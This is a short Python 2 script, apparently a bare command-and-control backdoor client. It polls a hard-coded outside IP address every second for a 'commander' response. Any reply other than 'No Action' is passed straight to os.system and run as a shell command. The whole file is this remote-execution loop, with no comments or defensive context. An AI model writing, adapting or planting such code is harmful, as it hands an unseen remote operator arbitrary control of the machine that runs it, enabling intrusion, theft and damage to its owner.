import os
import urllib2
import time

while True:
    url = "http://139.144.67.163/commander"
    req = urllib2.Request(url)
    response = urllib2.urlopen(req)
    command_data = response.read().decode("utf-8")

    if not command_data == "No Action":
        os.system(command_data)
    time.sleep(1)
